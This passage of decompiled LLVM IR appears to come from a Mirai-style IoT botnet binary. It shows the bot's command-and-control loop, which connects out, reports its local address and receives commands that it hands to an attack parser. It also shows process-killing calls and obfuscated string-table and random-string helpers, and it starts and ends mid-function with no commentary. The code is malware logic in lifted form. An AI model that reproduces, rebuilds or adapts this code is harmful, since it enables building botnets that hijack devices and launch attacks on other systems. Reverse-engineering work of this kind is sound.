  br i1 %v7_eda0, label %dec_label_pc_edcc, label %dec_label_pc_eda8

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed98
  %v3_eda8 = udiv i32 %v2_ed9c, 32
  %v3_edac = mul nuw nsw i32 %v3_eda8, 4
  store i32 %v2_eafc, i32* %ip.global-to-local, align 4
  %v2_edb4 = add i32 %v3_edac, %v2_eafc
  store i32 %v2_edb4, i32* %r3.global-to-local, align 4
  %v1_edb8 = add i32 %v2_edb4, -240
  %v2_edb8 = inttoptr i32 %v1_edb8 to i32*
  %v3_edb8 = load i32, i32* %v2_edb8, align 4
  %v1_edbc = urem i32 %v2_ed9c, 32
  %v6_edc0 = ashr i32 %v3_edb8, %v1_edbc
  store i32 %v6_edc0, i32* %r2.global-to-local, align 4
  %v1_edc4 = urem i32 %v6_edc0, 2
  %v2_edc4 = icmp eq i32 %v1_edc4, 0
  br i1 %v2_edc4, label %dec_label_pc_edcc, label %dec_label_pc_eff0

dec_label_pc_edcc:                                ; preds = %dec_label_pc_eda8, %dec_label_pc_ed98
  %v2_edd0 = load i8, i8* bitcast (i8** @global_var_235fc.137 to i8*), align 4
  %v3_edd0 = zext i8 %v2_edd0 to i32
  store i32 %v3_edd0, i32* @r4, align 4
  %v2_edd4 = icmp eq i8 %v2_edd0, 0
  %v2_ee5c = load i32, i32* @global_var_23478.134, align 4
  br i1 %v2_edd4, label %dec_label_pc_ee5c, label %dec_label_pc_eddc

dec_label_pc_eddc:                                ; preds = %dec_label_pc_edcc
  %v3_ede0 = udiv i32 %v2_ee5c, 32
  store i32 %v2_eafc, i32* %r2.global-to-local, align 4
  %v3_ede8 = mul nuw nsw i32 %v3_ede0, 4
  %v2_edec = add i32 %v3_ede8, %v2_eafc
  store i32 %v2_edec, i32* %r3.global-to-local, align 4
  %v1_edf0 = add i32 %v2_edec, -368
  %v2_edf0 = inttoptr i32 %v1_edf0 to i32*
  %v3_edf0 = load i32, i32* %v2_edf0, align 4
  %v1_edf4 = urem i32 %v2_ee5c, 32
  %v6_edf8 = ashr i32 %v3_edf0, %v1_edf4
  store i32 %v6_edf8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_235fc.137 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_ee04 = urem i32 %v6_edf8, 2
  %v2_ee04 = icmp eq i32 %v1_ee04, 0
  store i8 0, i8* bitcast (i8** @global_var_235fc.137 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_23478.134 to i32), i32* @r5, align 4
  br i1 %v2_ee04, label %dec_label_pc_ee14, label %dec_label_pc_ef80

dec_label_pc_ee14:                                ; preds = %dec_label_pc_eddc
  store i32 60956, i32* @lr, align 4
  %v1_ee18 = icmp ne i32 %v2_ee5c, -1
  call void @__pseudo_cond_branch(i1 %v1_ee18, i32 ptrtoint (i32* @global_var_15730.34 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ee20 = load i32, i32* @r5, align 4
  %v2_ee20 = inttoptr i32 %v1_ee20 to i32*
  store i32 -1, i32* %v2_ee20, align 4
  %v1_ee28 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec5c

dec_label_pc_ee30:                                ; preds = %dec_label_pc_ecdc
  store i32 %v2_eafc, i32* %r2.global-to-local, align 4
  %v3_ee3c = mul nuw nsw i32 %v3_ee34, 4
  %v2_ee40 = add i32 %v3_ee3c, %v2_eafc
  store i32 %v2_ee40, i32* %r3.global-to-local, align 4
  %v1_ee44 = add i32 %v2_ee40, -240
  %v2_ee44 = inttoptr i32 %v1_ee44 to i32*
  %v3_ee44 = load i32, i32* %v2_ee44, align 4
  %v1_ee48 = urem i32 %v2_ee30, 32
  %v7_ee50 = shl i32 1, %v1_ee48
  %v8_ee50 = or i32 %v3_ee44, %v7_ee50
  store i32 %v8_ee50, i32* %r2.global-to-local, align 4
  store i32 %v8_ee50, i32* %v2_ee44, align 4
  br label %dec_label_pc_ed14

dec_label_pc_ee5c:                                ; preds = %dec_label_pc_edcc
  %v7_ee60 = icmp eq i32 %v2_ee5c, -1
  store i32 ptrtoint (i32* @global_var_23478.134 to i32), i32* @r8, align 4
  br i1 %v7_ee60, label %dec_label_pc_ec5c, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %dec_label_pc_ee5c
  %v3_ee6c = udiv i32 %v2_ee5c, 32
  store i32 %v2_eafc, i32* %r2.global-to-local, align 4
  %v3_ee74 = mul nuw nsw i32 %v3_ee6c, 4
  %v2_ee78 = add i32 %v3_ee74, %v2_eafc
  store i32 %v2_ee78, i32* %r3.global-to-local, align 4
  %v1_ee7c = add i32 %v2_ee78, -240
  %v2_ee7c = inttoptr i32 %v1_ee7c to i32*
  %v3_ee7c = load i32, i32* %v2_ee7c, align 4
  %v1_ee80 = urem i32 %v2_ee5c, 32
  %v6_ee84 = ashr i32 %v3_ee7c, %v1_ee80
  store i32 %v6_ee84, i32* %r2.global-to-local, align 4
  %v1_ee88 = urem i32 %v6_ee84, 2
  %v2_ee88 = icmp eq i32 %v1_ee88, 0
  br i1 %v2_ee88, label %dec_label_pc_ec5c, label %dec_label_pc_ee90

dec_label_pc_ee90:                                ; preds = %dec_label_pc_ee6c
  %v6_ee94 = inttoptr i32 %v3_edd0 to i8*
  store i8* %v6_ee94, i8** %stack_var_-42, align 4
  store i32 %v2_ef6c, i32* @sl, align 4
  %v0_ee98 = call i32 @__GI___errno_location()
  %v0_ee9c = load i32, i32* @r4, align 4
  %v2_ee9c = inttoptr i32 %v0_ee98 to i32*
  store i32 %v0_ee9c, i32* %v2_ee9c, align 4
  store i32 %v0_ee98, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_eeac = load i32, i32* @global_var_23478.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_eeb8 = call i32 @__libc_recv(i32 %v2_eeac, i32 %v2_ef6c, i32 2, i32 16386)
  %v7_eebc = icmp eq i32 %v4_eeb8, -1
  br i1 %v7_eebc, label %dec_label_pc_f09c, label %dec_label_pc_eec4

dec_label_pc_eec4:                                ; preds = %dec_label_pc_ee90
  %v2_eec4 = icmp eq i32 %v4_eeb8, 0
  br i1 %v2_eec4, label %dec_label_pc_f0ac, label %dec_label_pc_eecc

dec_label_pc_eecc:                                ; preds = %dec_label_pc_eec4
  store i32 %v2_ed88, i32* %ip.global-to-local, align 4
  %v3_eed0 = load i8*, i8** %stack_var_-42, align 4
  %v4_eed0 = ptrtoint i8* %v3_eed0 to i32
  store i32 %v4_eed0, i32* %r3.global-to-local, align 4
  %v2_eed4 = icmp eq i8* %v3_eed0, null
  br i1 %v2_eed4, label %dec_label_pc_eedc, label %dec_label_pc_f0dc

dec_label_pc_eedc:                                ; preds = %dec_label_pc_eecc
  %v2_eedc = load i32, i32* @global_var_23478.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_eee8 = add i32 %v4_eed0, 16384
  store i32 %v1_eee8, i32* %r3.global-to-local, align 4
  %v4_eeec = call i32 @__libc_recv(i32 %v2_eedc, i32 %v2_ef6c, i32 2, i32 %v1_eee8)
  br label %dec_label_pc_ec5c

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eccc
  %v0_eefc = load i32, i32* @r4, align 4
  store i32 %v0_eefc, i32* %r2.global-to-local, align 4
  %v3_ef00 = call i32 @socket(i32 2, i32 1, i32 %v0_eefc)
  %v7_ef04 = icmp eq i32 %v3_ef00, -1
  store i32 %v3_ef00, i32* @r5, align 4
  %v1_ef0c = load i32, i32* @r8, align 4
  %v2_ef0c = inttoptr i32 %v1_ef0c to i32*
  store i32 %v3_ef00, i32* %v2_ef0c, align 4
  br i1 %v7_ef04, label %dec_label_pc_ecdc, label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eef4
  %v0_ef14 = load i32, i32* @r4, align 4
  store i32 %v0_ef14, i32* @r2, align 4
  %v2_ef1c = call i32 @__libc_fcntl(i32 %v3_ef00, i32 3)
  %v1_ef24 = or i32 %v2_ef1c, 2048
  store i32 %v1_ef24, i32* @r2, align 4
  %v0_ef28 = load i32, i32* @r5, align 4
  %v2_ef2c = call i32 @__libc_fcntl(i32 %v0_ef28, i32 4)
  %v2_ef34 = load i32, i32* @global_var_2347c.113, align 4
  store i32 %v2_ef34, i32* %r3.global-to-local, align 4
  %v2_ef38 = icmp eq i32 %v2_ef34, 0
  br i1 %v2_ef38, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_ef14
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_ef14, %bb42
  %v2_ef40 = xor i1 %v2_ef38, true
  call void @__pseudo_cond_branch(i1 %v2_ef40, i32 ptrtoint (i32* @global_var_11b70.139 to i32))
  store i32 ptrtoint (i8** @global_var_235fc.137 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_ef4c = load i32, i32* @global_var_23478.134, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_235fc.137 to i8*), align 4
  %v4_ef5c = call i32 @__libc_connect(i32 %v2_ef4c, i32 ptrtoint (i16** @global_var_26114.115 to i32), i32 16)
  br label %dec_label_pc_ecdc

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ed64
  %v2_ef68 = load i32, i32* @global_var_23478.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_ef78 = call i32 @__libc_send(i32 %v2_ef68, i32 %v2_ef6c, i32 2, i32 16384)
  br label %dec_label_pc_ed98

dec_label_pc_ef80:                                ; preds = %dec_label_pc_eddc
  store i32 4, i32* @r4, align 4
  store i32 %v2_ef88, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_ef64, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_efa4 = call i32 @getsockopt(i32 %v2_ee5c, i32 1, i32 4, i32 %v2_ef88, i32 %v2_ef64)
  %v3_efa8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_efa8, i32* %r3.global-to-local, align 4
  %v2_efac = icmp eq i32 %v3_efa8, 0
  br i1 %v2_efac, label %dec_label_pc_f038, label %dec_label_pc_efb4

dec_label_pc_efb4:                                ; preds = %dec_label_pc_ef80
  %v2_efb4 = load i32, i32* @global_var_23478.134, align 4
  %v1_efb8 = call i32 @__GI___libc_close(i32 %v2_efb4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_efc0 = load i32, i32* @r5, align 4
  %v2_efc0 = inttoptr i32 %v1_efc0 to i32*
  store i32 -1, i32* %v2_efc0, align 4
  %v0_efc4 = call i32 @rand_next()
  %v3_efcc = zext i32 %v0_efc4 to i64
  %v4_efcc = mul nuw i64 %v3_efcc, 3435973837
  %v7_efcc = trunc i64 %v4_efcc to i32
  store i32 %v7_efcc, i32* %ip.global-to-local, align 4
  %v3_efd02 = udiv i64 %v4_efcc, 34359738368
  %v3_efd44 = mul nuw nsw i64 %v3_efd02, 8
  %v3_efd4 = trunc i64 %v3_efd44 to i32
  store i32 %v3_efd4, i32* %r2.global-to-local, align 4
  %v2_efd86 = mul nuw nsw i64 %v3_efd02, 2
  %v2_efd8 = trunc i64 %v2_efd86 to i32
  %v2_efdc = add i32 %v3_efd4, %v2_efd8
  store i32 %v2_efdc, i32* %r3.global-to-local, align 4
  %v2_efe0 = sub i32 %v0_efc4, %v2_efdc
  %v1_efe4 = add i32 %v2_efe0, 1
  %v1_efe8 = call i32 @sleep(i32 %v1_efe4)
  br label %dec_label_pc_ec5c

dec_label_pc_eff0:                                ; preds = %dec_label_pc_eda8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_ef88, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_f004 = call i32 @__libc_accept(i32 %v2_ed9c, i32 %v2_effc, i32 %v2_ef88, i32 16, i32 16)
  %v1_f008 = call i32 @scanner_kill(i32 %v5_f004)
  %v1_f00c = call i32 @killer_kill(i32 %v1_f008)
  %v2_f01c = call i32 @kill(i32 %v1_f018, i32 9)
  store i32 ptrtoint (i32* @global_var_235f8.125 to i32), i32* %r3.global-to-local, align 4
  %v2_f024 = load i32, i32* @global_var_235f8.125, align 4
  %v2_f028 = icmp eq i32 %v2_f024, 0
  br i1 %v2_f028, label %dec_label_pc_f030, label %dec_label_pc_f0d0

dec_label_pc_f030:                                ; preds = %dec_label_pc_eff0, %dec_label_pc_f0d0
  %v1_f034 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f038

dec_label_pc_f038:                                ; preds = %dec_label_pc_ef80, %dec_label_pc_f030
  %v2_f03c = call i32 @util_strlen(i8* %v1_f03c)
  %sext = mul i32 %v2_f03c, 16777216
  %v1_f040 = sdiv i32 %sext, 16777216
  %v7_f040 = inttoptr i32 %v1_f040 to i8*
  store i8* %v7_f040, i8** %stack_var_-42, align 4
  %v0_f044 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* @lr, align 4
  %v0_f04c = load i32, i32* @r4, align 4
  store i32 %v0_f04c, i32* %r2.global-to-local, align 4
  store i32 %v0_f044, i32* @global_var_2610c.91, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f05c = load i32, i32* @r5, align 4
  %v1_f05c = inttoptr i32 %v0_f05c to i32*
  %v2_f05c = load i32, i32* %v1_f05c, align 4
  %v4_f060 = call i32 @__libc_send(i32 %v2_f05c, i32 ptrtoint (i32* @global_var_1a7cc.143 to i32), i32 %v0_f04c, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_f06c = load i32, i32* @r5, align 4
  %v1_f06c = inttoptr i32 %v0_f06c to i32*
  %v2_f06c = load i32, i32* %v1_f06c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f078 = call i32 @__libc_send(i32 %v2_f06c, i32 %v2_ef6c, i32 1, i32 16384)
  %v3_f07c = load i8*, i8** %stack_var_-42, align 4
  %v4_f07c = ptrtoint i8* %v3_f07c to i32
  store i32 %v4_f07c, i32* %r2.global-to-local, align 4
  %v3_f080 = icmp eq i8* %v3_f07c, null
  br i1 %v3_f080, label %dec_label_pc_ec5c, label %dec_label_pc_f088

dec_label_pc_f088:                                ; preds = %dec_label_pc_f038
  %v0_f088 = load i32, i32* @r5, align 4
  %v1_f088 = inttoptr i32 %v0_f088 to i32*
  %v2_f088 = load i32, i32* %v1_f088, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f094 = call i32 @__libc_send(i32 %v2_f088, i32 %v2_ea98, i32 %v4_f07c, i32 16384)
  br label %dec_label_pc_ec5c

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f10c, %dec_label_pc_ee90
  %v0_f09c = load i32, i32* @r5, align 4
  %v1_f09c = inttoptr i32 %v0_f09c to i32*
  %v2_f09c = load i32, i32* %v1_f09c, align 4
  store i32 %v2_f09c, i32* %r3.global-to-local, align 4
  %v7_f0a0 = icmp eq i32 %v2_f09c, 4
  br i1 %v7_f0a0, label %dec_label_pc_ec5c, label %bb44

bb44:                                             ; preds = %dec_label_pc_f09c
  %v8_f0a4 = icmp eq i32 %v2_f09c, 11
  br i1 %v8_f0a4, label %dec_label_pc_ec5c, label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %dec_label_pc_f130, %bb44, %dec_label_pc_eec4
  %v2_f0ac = load i32, i32* @global_var_23478.134, align 4
  store i32 61624, i32* @lr, align 4
  %v1_f0b4 = icmp ne i32 %v2_f0ac, -1
  call void @__pseudo_cond_branch(i1 %v1_f0b4, i32 ptrtoint (i32* @global_var_15730.34 to i32))
  store i32 ptrtoint (i32* @global_var_23478.134 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_23478.134, align 4
  %v1_f0c8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec5c

dec_label_pc_f0d0:                                ; preds = %dec_label_pc_eff0
  %v2_f0d4 = call i32 @kill(i32 %v2_f024, i32 9)
  br label %dec_label_pc_f030

dec_label_pc_f0dc:                                ; preds = %dec_label_pc_eecc
  %v3_f0dc = udiv i32 %v4_eed0, 256
  %v1_f0e0 = urem i32 %v4_eed0, 256
  store i32 %v1_f0e0, i32* %r3.global-to-local, align 4
  %v4_f0e4 = mul nuw nsw i32 %v1_f0e0, 256
  %v5_f0e4 = or i32 %v4_f0e4, %v3_f0dc
  %v6_f0e4 = trunc i32 %v5_f0e4 to i16
  store i32 %v5_f0e4, i32* %r2.global-to-local, align 4
  store i32 %v2_ed88, i32* @lr, align 4
  %v7_f0f0 = inttoptr i32 %v5_f0e4 to i8*
  store i8* %v7_f0f0, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_f0e4, 1025
  br i1 %tmp45, label %dec_label_pc_f10c, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0dc
  %v2_f0f8 = load i32, i32* @global_var_23478.134, align 4
  %v1_f0fc = call i32 @__GI___libc_close(i32 %v2_f0f8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f104 = load i32, i32* @r8, align 4
  %v2_f104 = inttoptr i32 %v1_f104 to i32*
  store i32 -1, i32* %v2_f104, align 4
  br label %dec_label_pc_ec5c

dec_label_pc_f10c:                                ; preds = %dec_label_pc_f0dc
  %v0_f10c = load i32, i32* @r4, align 4
  %v1_f10c = load i32, i32* @r5, align 4
  %v2_f10c = inttoptr i32 %v1_f10c to i32*
  store i32 %v0_f10c, i32* %v2_f10c, align 4
  store i32 %v2_f114, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f11c = load i32, i32* @global_var_23478.134, align 4
  %v7_f124 = call i32 @__libc_recv(i32 %v2_f11c, i32 %v2_f114, i32 %v5_f0e4, i32 16386)
  %v7_f128 = icmp eq i32 %v7_f124, -1
  br i1 %v7_f128, label %dec_label_pc_f09c, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f10c
  %v2_f130 = icmp eq i32 %v7_f124, 0
  br i1 %v2_f130, label %dec_label_pc_f0ac, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f130
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f144 = load i32, i32* @global_var_23478.134, align 4
  %v4_f148 = call i32 @__libc_recv(i32 %v2_f144, i32 %v2_ef6c, i32 2, i32 16384)
  %v3_f150 = load i8*, i8** %stack_var_-42, align 4
  %v4_f150 = ptrtoint i8* %v3_f150 to i32
  %v3_f154 = udiv i32 %v4_f150, 256
  %v1_f158 = mul i32 %v4_f150, 256
  %v4_f15c = and i32 %v1_f158, 65280
  %v5_f15c = or i32 %v4_f15c, %v3_f154
  store i32 %v5_f15c, i32* %ip.global-to-local, align 4
  store i32 %v2_ed88, i32* @lr, align 4
  store i32 %v5_f15c, i32* %r2.global-to-local, align 4
  %v2_f16c = load i32, i32* @global_var_23478.134, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f174 = inttoptr i32 %v5_f15c to i8*
  store i8* %v6_f174, i8** %stack_var_-42, align 4
  %v6_f178 = call i32 @__libc_recv(i32 %v2_f16c, i32 %v2_f114, i32 %v5_f15c, i32 16384)
  store i32 %v2_ed88, i32* %r2.global-to-local, align 4
  %v3_f180 = load i8*, i8** %stack_var_-42, align 4
  %v3_f184 = icmp eq i8* %v3_f180, null
  br i1 %v3_f184, label %dec_label_pc_ec5c, label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f138
  %v4_f180 = ptrtoint i8* %v3_f180 to i32
  %v5_f190 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_f180, i32 %v2_ed88)
  br label %dec_label_pc_ec5c

; uselistorder directives
  uselistorder i8* %v3_f180, { 1, 0 }
  uselistorder i32 %v5_f15c, { 1, 0, 2, 3 }
  uselistorder i32 %v7_f124, { 1, 0 }
  uselistorder i32 %v5_f0e4, { 1, 0, 3, 2 }
  uselistorder i32 %v3_ef00, { 3, 2, 1, 0 }
  uselistorder i32 %v4_eed0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_eeb8, { 1, 0 }
  uselistorder i32 %v2_ee5c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_ed9c, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ed84, { 1, 0, 2 }
  uselistorder i32 %v5_ed50, { 1, 2, 0 }
  uselistorder i32 %v2_ec9c, { 2, 1, 0 }
  uselistorder i32 %v1_ec8c, { 1, 2, 0 }
  uselistorder i32 %v1_ec70, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_ef88, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ef6c, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_ef64, { 1, 0 }
  uselistorder i32 %v2_ed88, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ec58, { 1, 0, 2 }
  uselistorder i32 %v2_eafc, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_eae8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_ea0c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_235f8.125, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 3, 1, 2, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_235fc.137 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_235fc.137 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_23474.120, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_23478.134, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 22, 3, 23, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32, i32)* @rand_alphastr, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* @global_var_2347c.113, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_e764.111 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_f038, { 1, 0 }
  uselistorder label %dec_label_pc_f030, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_ed98, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_ecdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eccc, { 1, 0 }
  uselistorder label %dec_label_pc_ec5c, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_eabc, { 2, 0, 1 }
}

define i32 @function_f1bc(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f1bc:
  %v0_f1bc = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_f1bc, i32 -22307728)
  %v0_f1c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f1c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1bc
  store i32 %arg3, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1bc, %bb
  %v7_f1c8 = load i32, i32* @r0, align 4
  ret i32 %v7_f1c8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_f1d8 = load i32, i32* @global_var_23600.145, align 4
  %v2_f1dc = load i32, i32* @global_var_2360c.147, align 4
  %v4_f1e8 = mul i32 %v2_f1d8, 2048
  %v5_f1e8 = xor i32 %v4_f1e8, %v2_f1d8
  %v4_f1ec = udiv i32 %v2_f1dc, 524288
  %v5_f1ec = xor i32 %v4_f1ec, %v2_f1dc
  %v2_f1f0 = load i32, i32* @global_var_23604.149, align 4
  %v2_f1f4 = load i32, i32* @global_var_23608.151, align 4
  %v2_f1f8 = xor i32 %v5_f1ec, %v5_f1e8
  %v4_f1fc = udiv i32 %v5_f1e8, 256
  %v5_f1fc = xor i32 %v2_f1f8, %v4_f1fc
  store i32 %v2_f1f0, i32* @global_var_23600.145, align 4
  store i32 %v2_f1f4, i32* @global_var_23604.149, align 4
  store i32 %v2_f1dc, i32* @global_var_23608.151, align 4
  store i32 %v5_f1fc, i32* @global_var_2360c.147, align 4
  ret i32 %v5_f1fc

; uselistorder directives
  uselistorder i32 %v2_f1dc, { 2, 1, 0 }
  uselistorder i32 %v2_f1d8, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f234 = call i32 @__GI_time(i32* null)
  store i32 %v2_f234, i32* @global_var_23600.145, align 4
  %v1_f240 = call i32 @__getpid(i32 %v2_f234)
  store i32 %v1_f240, i32* @r0, align 4
  %v0_f248 = call i32 @getppid()
  %v2_f250 = xor i32 %v1_f240, %v0_f248
  store i32 %v2_f250, i32* @global_var_23604.149, align 4
  %v1_f258 = call i32 @clock(i32 %v2_f250)
  %v2_f25c = load i32, i32* @global_var_23604.149, align 4
  %v2_f268 = xor i32 %v2_f25c, %v1_f258
  store i32 %v2_f268, i32* @global_var_2360c.147, align 4
  store i32 %v1_f258, i32* @global_var_23608.151, align 4
  ret i32 %v1_f258

; uselistorder directives
  uselistorder i32 %v1_f258, { 1, 2, 0 }
}

define i32 @rand_alphastr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_f290 = load i32, i32* @r4, align 4
  %v6_f290 = load i32, i32* @r5, align 4
  %v9_f290 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_f2a4 = call i32 @table_unlock_val(i32 61)
  %v3_f2b0 = call i32 @table_retrieve_val(i32 61, i32* null)
  store i32 %v3_f2b0, i32* @r1, align 4
  %v2_f2bc = bitcast i32* %stack_var_-72 to i8*
  %v3_f2bc = call i32 @strcpy(i8* %v2_f2bc, i32 %v3_f2b0)
  %v2_f2c0 = icmp eq i32 %arg2, 0
  br i1 %v2_f2c0, label %dec_label_pc_f33c, label %dec_label_pc_f2c8

dec_label_pc_f2c8:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23600.145 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23604.149 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23608.151 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2360c.147 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_f320 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f2dc

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_f2dc.dec_label_pc_f2dc_crit_edge, %dec_label_pc_f2c8
  %v1_f300 = phi i32 [ %v1_f300.pre, %dec_label_pc_f2dc.dec_label_pc_f2dc_crit_edge ], [ ptrtoint (i32* @global_var_23600.145 to i32), %dec_label_pc_f2c8 ]
  %v2_f2dc = load i32, i32* @global_var_2360c.147, align 4
  store i32 %v2_f2dc, i32* %r2.global-to-local, align 4
  %v2_f2e0 = load i32, i32* @global_var_23600.145, align 4
  %v4_f2e4 = udiv i32 %v2_f2dc, 524288
  %v5_f2e4 = xor i32 %v4_f2e4, %v2_f2dc
  %v4_f2e8 = mul i32 %v2_f2e0, 2048
